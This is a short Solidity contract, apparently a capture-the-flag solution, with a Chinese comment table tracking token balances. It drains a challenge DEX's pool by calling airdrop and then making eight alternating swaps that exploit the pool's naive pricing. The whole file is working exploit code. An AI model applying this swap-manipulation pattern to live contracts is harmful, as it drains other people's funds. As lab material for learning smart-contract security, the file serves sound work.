/*
学生拥有          题目拥有
5      5        100    50        换10个A
15     0        90     55       换9个B
1      9        104    46       换20个A
21     1        84     54       换14个B
0      15       105    39       换40个A
40     0        65     53        换33个B
1      33       104    20       换104个A
105    12       0      43       换44个B  
105    55       0      0         完成

*/
pragma solidity ^0.6.0;
import "./swapdex.sol";
contract attck{
    check che;
    address token1;
    address token2;
    constructor(address _che)public{
        che = check(_che);
        token1 = address(che.token1());
        token2 = address(che.token2());
    }

    function attack()public{
        che.airdrop();
        ERC20(token1).approve(address(che),1 ether);
        ERC20(token2).approve(address(che),1 ether);
        che.swap(token2,token1,10);
        che.swap(token1,token2,9);
        che.swap(token2,token1,20);
        che.swap(token1,token2,14);
        che.swap(token2,token1,40);
        che.swap(token1,token2,33);
        che.swap(token2,token1,104);
        che.swap(token1,token2,44);
    }

    function complete()public{
        che.isCompleted();
    }
}